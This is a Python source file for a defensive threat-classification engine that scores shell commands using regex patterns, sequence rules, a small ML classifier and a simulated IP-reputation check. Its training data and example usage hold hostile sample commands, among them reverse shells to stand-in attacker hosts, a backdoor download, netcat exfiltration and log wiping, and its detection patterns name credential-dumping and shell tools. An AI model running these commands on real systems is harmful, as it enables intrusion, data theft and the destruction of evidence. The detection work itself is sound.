import json
import logging
import os
import time
import re
import uuid
import ipaddress
import threading
import queue
import random
import numpy as np
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Any, Optional, Union
from collections import defaultdict
import requests
from sklearn.feature_extraction.text import CountVectorizer
from sklearn.naive_bayes import MultinomialNB
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report
import joblib

# Ensure required directories exist
os.makedirs("models", exist_ok=True)
os.makedirs("logs/threats", exist_ok=True)
os.makedirs("data/threat_intel", exist_ok=True)

# Initialize logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("logs/threats/threat_classification.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("ThreatClassification")

class CommandFeatureExtractor:
    """Extract features from command strings for ML classification"""
    
    def __init__(self, vectorizer_path: str = "models/command_vectorizer.pkl"):
        self.vectorizer_path = vectorizer_path
        
        # Load or create vectorizer
        if os.path.exists(vectorizer_path):
            self.vectorizer = joblib.load(vectorizer_path)
        else:
            self.vectorizer = CountVectorizer(
                analyzer='word',
                token_pattern=r'\b\w+\b',
                ngram_range=(1, 3),
                max_features=5000
            )
            
    def train_vectorizer(self, commands: List[str]) -> None:
        """Train the vectorizer on a set of commands"""
        self.vectorizer.fit(commands)
        joblib.dump(self.vectorizer, self.vectorizer_path)
        
    def extract_features(self, command: str) -> np.ndarray:
        """Extract features from a command string"""
        return self.vectorizer.transform([command])
        
    def extract_features_batch(self, commands: List[str]) -> np.ndarray:
        """Extract features from multiple commands"""
        return self.vectorizer.transform(commands)
        
    def get_feature_names(self) -> List[str]:
        """Get the feature names from the vectorizer"""
        return self.vectorizer.get_feature_names_out()


class CommandPatternAnalyzer:
    """Analyze command patterns for known attack signatures"""
    
    def __init__(self, patterns_file: str = "data/threat_intel/command_patterns.json"):
        self.patterns_file = patterns_file
        self.patterns = self._load_patterns()
        
    def _load_patterns(self) -> Dict[str, Dict[str, Any]]:
        """Load command patterns from file or use defaults"""
        if os.path.exists(self.patterns_file):
            try:
                with open(self.patterns_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                logger.error(f"Error loading patterns: {str(e)}")
                
        # Default patterns
        return {
            "reconnaissance": {
                "patterns": [
                    r"\buname\s+-a\b",
                    r"\bcat\s+/etc/passwd\b",
                    r"\bwhoami\b",
                    r"\bhostname\b",
                    r"\bip\s+a\b",
                    r"\bifconfig\b",
                    r"\bsysteminfo\b",
                    r"\bnet\s+user\b",
                    r"\bps(\s|$)",
                    r"\bnetstat\b"
                ],
                "severity": "low",
                "description": "System reconnaissance commands"
            },
            "vulnerability_scanning": {
                "patterns": [
                    r"\bnmap\b",
                    r"\bnessus\b",
                    r"\bnexpose\b",
                    r"\bopenvas\b",
                    r"\bnikto\b",
                    r"\bdirb\b",
                    r"\bsqlmap\b",
                    r"\bgobuster\b"
                ],
                "severity": "medium",
                "description": "Vulnerability scanning tools"
            },
            "credential_access": {
                "patterns": [
                    r"\bhydra\b",
                    r"\bjohn\b",
                    r"\bhashcat\b",
                    r"\bcred\w*dump\b",
                    r"\bmimikatz\b",
                    r"\bcat\s+.*shadow\b",
                    r"\bgrep\s+-r\s+.*password\b"
                ],
                "severity": "high",
                "description": "Credential access and password cracking attempts"
            },
            "privilege_escalation": {
                "patterns": [
                    r"\bsudo\b",
                    r"\bsu\s+root\b",
                    r"\bfind\s+.*-perm\b",
                    r"\bperl\s+-e\b",
                    r"\bpython\s+-c\b",
                    r"\bbash\s+-i\b",
                    r"\bchmod\s+.*\+s\b",
                    r"\binvoke-expression\b"
                ],
                "severity": "high",
                "description": "Privilege escalation attempts"
            },
            "lateral_movement": {
                "patterns": [
                    r"\bssh\s+\S+@\S+\b",
                    r"\bpsexec\b",
                    r"\bwinrm\b",
                    r"\bwmic\s+/node\b",
                    r"\bnet\s+use\b",
                    r"\bmount\b"
                ],
                "severity": "high",
                "description": "Lateral movement attempts"
            },
            "data_exfiltration": {
                "patterns": [
                    r"\bscp\b",
                    r"\bsftp\b",
                    r"\brsync\b",
                    r"\bcurl\s+.*-o\b",
                    r"\bwget\s+.*-O\b",
                    r"\btar\s+.*-c\b",
                    r"\bzip\b",
                    r"\bbase64\b",
                    r"\bnc\s+\S+\s+\d+\b"
                ],
                "severity": "critical",
                "description": "Data exfiltration attempts"
            },
            "persistence": {
                "patterns": [
                    r"\bcrontab\b",
                    r"\bschtasks\b",
                    r"\bat\b",
                    r"\bchkconfig\b",
                    r"\bupdate-rc\.d\b",
                    r"\bsystemctl\s+enable\b",
                    r"\buseradd\b",
                    r"\bnet\s+user\s+\S+\s+/add\b"
                ],
                "severity": "critical",
                "description": "Persistence establishment"
            },
            "command_and_control": {
                "patterns": [
                    r"\bpowershell\s+-enc\b",
                    r"\biex\b",
                    r"\bcurl\s+.*\|\s*bash\b",
                    r"\bwget\s+.*\|\s*bash\b",
                    r"\bnslookup\s+.*\.\S+\.\S+\b",
                    r"\bdig\s+.*\.\S+\.\S+\b",
                    r"\bping\s+-c\b"
                ],
                "severity": "critical",
                "description": "Command and control communication"
            },
            "defense_evasion": {
                "patterns": [
                    r"\bunset\s+HISTORY\b",
                    r"\bhistory\s+-c\b",
                    r"\brm\s+.*\.bash_history\b",
                    r"\btouch\s+.*\b",
                    r"\bchattr\b",
                    r"\bclear\s+event\s*log\b",
                    r"\bwevtutil\s+cl\b",
                    r"\bexport\s+HISTSIZE=0\b"
                ],
                "severity": "high",
                "description": "Defense evasion and anti-forensics"
            }
        }
        
    def save_patterns(self) -> None:
        """Save patterns to file"""
        os.makedirs(os.path.dirname(self.patterns_file), exist_ok=True)
        with open(self.patterns_file, 'w') as f:
            json.dump(self.patterns, f, indent=2)
            
    def add_pattern(self, category: str, pattern: str, severity: str = "medium") -> None:
        """Add a new pattern to a category"""
        if category not in self.patterns:
            self.patterns[category] = {
                "patterns": [],
                "severity": severity,
                "description": f"{category.replace('_', ' ').title()} commands"
            }
            
        if pattern not in self.patterns[category]["patterns"]:
            self.patterns[category]["patterns"].append(pattern)
            self.save_patterns()
            
    def analyze_command(self, command: str) -> List[Dict[str, Any]]:
        """Analyze a command for known patterns"""
        matches = []
        
        for category, info in self.patterns.items():
            for pattern in info["patterns"]:
                if re.search(pattern, command, re.IGNORECASE):
                    matches.append({
                        "category": category,
                        "severity": info["severity"],
                        "description": info["description"],
                        "pattern": pattern
                    })
                    break  # Only match once per category
                    
        return matches
        
    def get_severity_level(self, severity: str) -> int:
        """Convert severity string to numeric level"""
        severity_levels = {
            "low": 1,
            "medium": 2,
            "high": 3,
            "critical": 4
        }
        return severity_levels.get(severity.lower(), 0)


class BehaviorAnalyzer:
    """Analyze sequences of commands to identify complex attack patterns"""
    
    def __init__(self, window_size: int = 5):
        self.window_size = window_size
        self.attack_sequences = self._load_attack_sequences()
        
    def _load_attack_sequences(self) -> Dict[str, Dict[str, Any]]:
        """Load known attack sequences"""
        # In a production system, these would be loaded from a database or file
        return {
            "reconnaissance_to_exploit": {
                "commands": ["nmap", "searchsploit", "wget", "chmod", "bash"],
                "severity": "high",
                "description": "Reconnaissance followed by exploit download and execution"
            },
            "credential_harvesting": {
                "commands": ["find", "grep password", "cat", "zip", "scp"],
                "severity": "high",
                "description": "Searching for and exfiltrating credentials"
            },
            "persistence_creation": {
                "commands": ["useradd", "usermod", "crontab", "chmod", "echo"],
                "severity": "critical",
                "description": "Creating persistence mechanisms"
            },
            "lateral_movement_prep": {
                "commands": ["ifconfig", "ip", "netstat", "ping", "ssh"],
                "severity": "medium",
                "description": "Preparing for lateral movement"
            },
            "data_staging": {
                "commands": ["find", "cp", "mv", "tar", "zip"],
                "severity": "high",
                "description": "Staging data for exfiltration"
            }
        }
        
    def check_command_sequence(self, commands: List[str]) -> List[Dict[str, Any]]:
        """Check if a sequence of commands matches known attack patterns"""
        if len(commands) < 2:
            return []
            
        # Use sliding window to check for patterns
        matches = []
        window = min(self.window_size, len(commands))
        
        for seq_name, seq_info in self.attack_sequences.items():
            seq_commands = seq_info["commands"]
            seq_len = len(seq_commands)
            
            if seq_len <= window:
                # Check if all commands in the sequence appear in the window, in order
                command_str = " ".join(commands[-window:]).lower()
                seq_found = True
                
                # Check if all commands in the sequence are present in the recent commands
                for cmd in seq_commands:
                    if cmd.lower() not in command_str:
                        seq_found = False
                        break
                        
                if seq_found:
                    matches.append({
                        "sequence": seq_name,
                        "severity": seq_info["severity"],
                        "description": seq_info["description"],
                        "matched_commands": seq_commands
                    })
                    
        return matches
        
    def check_command_frequency(self, commands: List[str], timespan: timedelta) -> Dict[str, Any]:
        """Check command frequency for potential DoS or brute force attacks"""
        if not commands:
            return {}
            
        # Count commands
        command_counts = defaultdict(int)
        for cmd in commands:
            base_cmd = cmd.split()[0] if cmd else ""
            command_counts[base_cmd] += 1
            
        # Check for high-frequency commands
        threshold = max(10, len(commands) // 5)  # Adjust threshold based on total commands
        high_freq_cmds = {cmd: count for cmd, count in command_counts.items() 
                          if count > threshold and cmd}
                          
        if high_freq_cmds:
            # Calculate commands per minute
            minutes = max(timespan.total_seconds() / 60, 1)
            cmd_per_minute = {cmd: count / minutes for cmd, count in high_freq_cmds.items()}
            
            max_cmd, max_freq = max(cmd_per_minute.items(), key=lambda x: x[1])
            
            # Determine severity based on frequency
            severity = "low"
            if max_freq > 20:
                severity = "medium"
            if max_freq > 50:
                severity = "high"
            if max_freq > 100:
                severity = "critical"
                
            return {
                "detected": True,
                "type": "high_frequency_commands",
                "severity": severity,
                "description": f"High frequency of commands detected ({max_freq:.1f} per minute)",
                "details": dict(cmd_per_minute)
            }
            
        return {"detected": False}


class IPReputation:
    """Check reputation of IP addresses against threat intelligence feeds"""
    
    def __init__(self, cache_ttl: int = 86400):
        self.cache = {}  # IP -> (result, timestamp)
        self.cache_ttl = cache_ttl  # Cache time-to-live in seconds
        self.lock = threading.Lock()
        
    def check_ip(self, ip: str) -> Dict[str, Any]:
        """Check an IP against threat intelligence sources"""
        # Validate IP
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            return {"error": "Invalid IP address"}
            
        # Check cache
        with self.lock:
            if ip in self.cache:
                result, timestamp = self.cache[ip]
                if (datetime.now() - timestamp).total_seconds() < self.cache_ttl:
                    return result
                    
        # For demo purposes, use a simple algorithm to check IP reputation
        # In a real system, this would call external threat intel APIs
        result = self._check_ip_demo(ip)
        
        # Cache the result
        with self.lock:
            self.cache[ip] = (result, datetime.now())
            
        return result
        
    def _check_ip_demo(self, ip: str) -> Dict[str, Any]:
        """Demo implementation of IP reputation check"""
        # Convert IP to numeric value for consistent "random" results
        ip_parts = ip.split('.')
        ip_num = sum(int(part) * (256 ** i) for i, part in enumerate(reversed(ip_parts)))
        
        # Seed random with IP for consistent results
        random.seed(ip_num)
        
        # Check private IP ranges
        if ip.startswith(('10.', '172.16.', '192.168.')):
            return {
                "malicious": False,
                "score": 0,
                "categories": [],
                "source": "local_analysis"
            }
            
        # For demo, assign random reputation data
        malicious_chance = random.random()
        categories = []
        
        if malicious_chance < 0.8:  # 80% of IPs are clean in this demo
            malicious = False
            score = random.uniform(0, 20)
        else:
            malicious = True
            score = random.uniform(60, 100)
            
            # Add threat categories
            potential_categories = [
                "scanning", "bruteforce", "malware", "botnet", 
                "ransomware", "proxy", "tor", "spam"
            ]
            
            num_categories = random.randint(1, 3)
            categories = random.sample(potential_categories, num_categories)
            
        return {
            "malicious": malicious,
            "score": round(score, 1),
            "categories": categories,
            "source": "demo_intelligence"
        }
        
    def clear_cache(self) -> None:
        """Clear the IP reputation cache"""
        with self.lock:
            self.cache = {}


class ThreatModel:
    """ML model for classifying threats based on command sequences"""
    
    def __init__(self, model_path: str = "models/threat_classifier.pkl", 
                 training_data_path: str = "data/threat_intel/training_data.json"):
        self.model_path = model_path
        self.training_data_path = training_data_path
        self.feature_extractor = CommandFeatureExtractor()
        self.model = self._load_model()
        
    def _load_model(self) -> Any:
        """Load the ML model or create a new one if it doesn't exist"""
        if os.path.exists(self.model_path):
            try:
                return joblib.load(self.model_path)
            except Exception as e:
                logger.error(f"Error loading model: {str(e)}")
                
        # Create a default model
        return RandomForestClassifier(n_estimators=100, random_state=42)
        
    def _load_training_data(self) -> Tuple[List[str], List[str]]:
        """Load training data or use defaults"""
        if os.path.exists(self.training_data_path):
            try:
                with open(self.training_data_path, 'r') as f:
                    data = json.load(f)
                    return data["commands"], data["labels"]
            except Exception as e:
                logger.error(f"Error loading training data: {str(e)}")
                
        # Default training data
        commands = [
            "ls -la", "pwd", "cat /etc/passwd", "whoami",  # Reconnaissance
            "nmap -sV 192.168.1.1", "dirb http://target", "sqlmap -u http://target",  # Scanning
            "ssh user@host", "scp file user@host:", "net use \\\\host\\share",  # Lateral movement
            "wget http://malicious/file", "curl -o malware http://bad/file",  # Malware download
            "nc -e /bin/bash host 4444", "bash -i >& /dev/tcp/host/4444 0>&1",  # Reverse shell
            "chmod +s /bin/bash", "sudo su -", "net user hacker password /add",  # Privilege escalation
            "tar -czvf data.tar.gz /etc/passwd", "zip -r data.zip /home/user",  # Data collection
            "scp data.zip user@attacker:", "nc attacker 4444 < data.tar.gz",  # Exfiltration
            "rm -rf /var/log/*", "history -c", "unset HISTFILE"  # Covering tracks
        ]
        
        labels = [
            "reconnaissance", "reconnaissance", "reconnaissance", "reconnaissance",
            "scanning", "scanning", "scanning",
            "lateral_movement", "lateral_movement", "lateral_movement",
            "malware", "malware",
            "reverse_shell", "reverse_shell",
            "privilege_escalation", "privilege_escalation", "privilege_escalation",
            "data_collection", "data_collection",
            "exfiltration", "exfiltration",
            "covering_tracks", "covering_tracks", "covering_tracks"
        ]
        
        return commands, labels
        
    def train(self, commands: List[str] = None, labels: List[str] = None) -> None:
        """Train the threat classification model"""
        if commands is None or labels is None:
            commands, labels = self._load_training_data()
            
        if len(commands) != len(labels) or not commands:
            logger.error("Invalid training data")
            return
            
        # Train the vectorizer
        self.feature_extractor.train_vectorizer(commands)
        
        # Extract features
        X = self.feature_extractor.extract_features_batch(commands)
        y = np.array(labels)
        
        # Split data
        X_train, X_test, y_train, y_test = train_test_split(
            X, y, test_size=0.2, random_state=42
        )
        
        # Train model
        self.model.fit(X_train, y_train)
        
        # Evaluate
        y_pred = self.model.predict(X_test)
        logger.info("Model training complete. Classification report:")
        logger.info("\n" + classification_report(y_test, y_pred))
        
        # Save model
        joblib.dump(self.model, self.model_path)
        
        # Save training data
        os.makedirs(os.path.dirname(self.training_data_path), exist_ok=True)
        with open(self.training_data_path, 'w') as f:
            json.dump({"commands": commands, "labels": labels}, f, indent=2)
            
    def predict(self, command: str) -> Dict[str, Any]:
        """Predict threat category for a command"""
        # Extract features
        X = self.feature_extractor.extract_features(command)
        
        # Predict
        label = self.model.predict(X)[0]
        
        # Get probabilities
        probs = self.model.predict_proba(X)[0]
        class_indices = {i: c for i, c in enumerate(self.model.classes_)}
        probabilities = {class_indices[i]: float(p) for i, p in enumerate(probs)}
        
        # Get confidence
        confidence = max(probs)
        
        return {
            "category": label,
            "confidence": float(confidence),
            "probabilities": probabilities
        }


class ThreatClassifier:
    """Main threat classification engine"""
    
    def __init__(self):
        self.pattern_analyzer = CommandPatternAnalyzer()
        self.behavior_analyzer = BehaviorAnalyzer()
        self.ip_reputation = IPReputation()
        self.threat_model = ThreatModel()
        
        # Train model if needed
        if not os.path.exists(self.threat_model.model_path):
            logger.info("Training threat classification model...")
            self.threat_model.train()
            
        # Session tracking
        self.sessions = {}  # session_id -> session_data
        self.lock = threading.Lock()
        
        # Alert queue
        self.alert_queue = queue.Queue()
        self.alert_thread = threading.Thread(target=self._process_alerts, daemon=True)
        self.alert_thread.start()
        
    def classify_command(self, session_id: str, client_ip: str, command: str, 
                          system_type: str = "linux") -> Dict[str, Any]:
        """Classify a command for threats"""
        # Get or create session data
        session = self._get_session(session_id, client_ip, system_type)
        
        # Record command
        timestamp = datetime.now()
        session["commands"].append({
            "command": command,
            "timestamp": timestamp.isoformat()
        })
        
        # Update session timestamps
        session["last_activity"] = timestamp.isoformat()
        if len(session["commands"]) == 1:
            session["start_time"] = timestamp.isoformat()
            
        # Get all commands in session
        commands = [c["command"] for c in session["commands"]]
        
        # Run ML prediction
        ml_result = self.threat_model.predict(command)
        
        # Check command patterns
        pattern_matches = self.pattern_analyzer.analyze_command(command)
        
        # Check command sequences
        sequence_matches = self.behavior_analyzer.check_command_sequence(commands)
        
        # Check command frequency
        session_start = datetime.fromisoformat(session["start_time"])
        session_duration = timestamp - session_start
        frequency_result = self.behavior_analyzer.check_command_frequency(commands, session_duration)
        
        # Check IP reputation (async)
        threading.Thread(target=self._check_ip_reputation, 
                        args=(session_id, client_ip), 
                        daemon=True).start()
        
        # Determine overall threat level
        threat_levels = []
        
        # Add ML prediction threat level
        if ml_result["category"] in ["reverse_shell", "privilege_escalation", "exfiltration"]:
            ml_severity = "high" if ml_result["confidence"] > 0.7 else "medium"
            threat_levels.append(self.pattern_analyzer.get_severity_level(ml_severity))
            
        # Add pattern match threat levels
        for match in pattern_matches:
            threat_levels.append(self.pattern_analyzer.get_severity_level(match["severity"]))
            
        # Add sequence match threat levels
        for match in sequence_matches:
            threat_levels.append(self.pattern_analyzer.get_severity_level(match["severity"]))
            
        # Add frequency threat level
        if frequency_result.get("detected", False):
            threat_levels.append(self.pattern_analyzer.get_severity_level(frequency_result["severity"]))
            
        # Calculate overall threat level
        overall_level = max(threat_levels) if threat_levels else 0
        
        # Convert numeric level to severity string
        severity_map = {0: "info", 1: "low", 2: "medium", 3: "high", 4: "critical"}
        overall_severity = severity_map.get(overall_level, "info")
        
        # Create threat report
        threat_report = {
            "session_id": session_id,
            "client_ip": client_ip,
            "command": command,
            "timestamp": timestamp.isoformat(),
            "ml_classification": ml_result,
            "pattern_matches": pattern_matches,
            "sequence_matches": sequence_matches,
            "command_frequency": frequency_result,
            "threat_level": overall_level,
            "threat_severity": overall_severity,
            "session_command_count": len(session["commands"])
        }
        
        # Add threat report to session
        session["threat_reports"].append(threat_report)
        
        # Check if alert should be generated
        if overall_level >= 3:  # high or critical
            self._queue_alert(threat_report)
            
        return threat_report
        
    def _get_session(self, session_id: str, client_ip: str, system_type: str) -> Dict[str, Any]:
        """Get or create a session"""
        with self.lock:
            if session_id not in self.sessions:
                self.sessions[session_id] = {
                    "session_id": session_id,
                    "client_ip": client_ip,
                    "system_type": system_type,
                    "start_time": datetime.now().isoformat(),
                    "last_activity": datetime.now().isoformat(),
                    "commands": [],
                    "threat_reports": [],
                    "ip_reputation": None
                }
            return self.sessions[session_id]
            
    def _check_ip_reputation(self, session_id: str, client_ip: str) -> None:
        """Check IP reputation and update session"""
        reputation = self.ip_reputation.check_ip(client_ip)
        
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]["ip_reputation"] = reputation
                
                # If IP is malicious, generate alert
                if reputation.get("malicious", False):
                    threat_report = {
                        "session_id": session_id,
                        "client_ip": client_ip,
                        "timestamp": datetime.now().isoformat(),
                        "type": "malicious_ip",
                        "threat_level": 3,  # high
                        "threat_severity": "high",
                        "ip_reputation": reputation
                    }
                    self._queue_alert(threat_report)
                    
    def _queue_alert(self, threat_report: Dict[str, Any]) -> None:
        """Queue an alert for processing"""
        self.alert_queue.put(threat_report)
        
    def _process_alerts(self) -> None:
        """Process alerts from the queue"""
        while True:
            try:
                threat_report = self.alert_queue.get(timeout=1)
                self._send_alert(threat_report)
                self.alert_queue.task_done()
            except queue.Empty:
                time.sleep(0.1)
            except Exception as e:
                logger.error(f"Error processing alert: {str(e)}")
                
    def _send_alert(self, threat_report: Dict[str, Any]) -> None:
        """Send a threat alert (to SIEM, notification system, etc.)"""
        # In a real system, this would send to a SIEM, notification system, etc.
        alert_id = str(uuid.uuid4())
        timestamp = datetime.now().isoformat()
        
        alert = {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "severity": threat_report["threat_severity"],
            "session_id": threat_report["session_id"],
            "client_ip": threat_report["client_ip"],
            "threat_report": threat_report
        }
        
        # Log the alert
        logger.warning(f"THREAT ALERT: {alert['severity'].upper()} - Session {alert['session_id']} - IP {alert['client_ip']}")
        
        # Save alert to file
        alert_file = f"logs/threats/alert_{alert_id}.json"
        with open(alert_file, 'w') as f:
            json.dump(alert, f, indent=2)
            
        # In a real system, you would send this to your SIEM, notification system, etc.
        # For example:
        # self._send_to_siem(alert)
        # self._send_notification(alert)
        
    def get_session_threat_summary(self, session_id: str) -> Dict[str, Any]:
        """Get a summary of threats for a session"""
        with self.lock:
            if session_id not in self.sessions:
                return {"error": "Session not found"}
                
            session = self.sessions[session_id]
            
            # Calculate highest threat level
            threat_levels = [report.get("threat_level", 0) for report in session["threat_reports"]]
            max_threat_level = max(threat_levels) if threat_levels else 0
            
            # Convert to severity
            severity_map = {0: "info", 1: "low", 2: "medium", 3: "high", 4: "critical"}
            max_severity = severity_map.get(max_threat_level, "info")
            
            # Count threat types
            threat_types = defaultdict(int)
            for report in session["threat_reports"]:
                ml_category = report.get("ml_classification", {}).get("category", "unknown")
                threat_types[ml_category] += 1
                
                for match in report.get("pattern_matches", []):
                    threat_types[match["category"]] += 1
                    
            # Get most recent commands
            recent_commands = []
            for cmd_entry in reversed(session["commands"][-10:]):
                recent_commands.append(cmd_entry["command"])
                
            return {
                "session_id": session_id,
                "client_ip": session["client_ip"],
                "start_time": session["start_time"],
                "last_activity": session["last_activity"],
                "command_count": len(session["commands"]),
                "threat_report_count": len(session["threat_reports"]),
                "max_threat_level": max_threat_level,
                "max_threat_severity": max_severity,
                "threat_types": dict(threat_types),
                "recent_commands": recent_commands,
                "ip_reputation": session.get("ip_reputation")
            }
            
    def clear_old_sessions(self, max_age_hours: int = 24) -> int:
        """Clear sessions older than the specified age"""
        with self.lock:
            now = datetime.now()
            to_delete = []
            
            for session_id, session in self.sessions.items():
                last_activity = datetime.fromisoformat(session["last_activity"])
                age = now - last_activity
                
                if age.total_seconds() > max_age_hours * 3600:
                    to_delete.append(session_id)
                    
            for session_id in to_delete:
                del self.sessions[session_id]
                
            return len(to_delete)


# Example usage
def example_usage():
    """Example usage of the threat classification system"""
    classifier = ThreatClassifier()
    
    # Create a session
    session_id = str(uuid.uuid4())
    client_ip = "203.0.113.1"  # Example IP
    
    # Classify some commands
    commands = [
        "ls -la",
        "whoami",
        "cat /etc/passwd",
        "find / -perm -u=s -type f 2>/dev/null",
        "wget http://malicious-site.com/backdoor -O /tmp/backdoor",
        "chmod +x /tmp/backdoor",
        "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "rm -rf /var/log/*"
    ]
    
    for command in commands:
        result = classifier.classify_command(session_id, client_ip, command)
        print(f"Command: {command}")
        print(f"Classification: {result['ml_classification']['category']} (confidence: {result['ml_classification']['confidence']:.2f})")
        print(f"Threat severity: {result['threat_severity']}")
        print("---")
        
    # Get session summary
    summary = classifier.get_session_threat_summary(session_id)
    print("\nSession Summary:")
    print(f"Command count: {summary['command_count']}")
    print(f"Max threat severity: {summary['max_threat_severity']}")
    print(f"Threat types: {summary['threat_types']}")


if __name__ == "__main__":
    example_usage()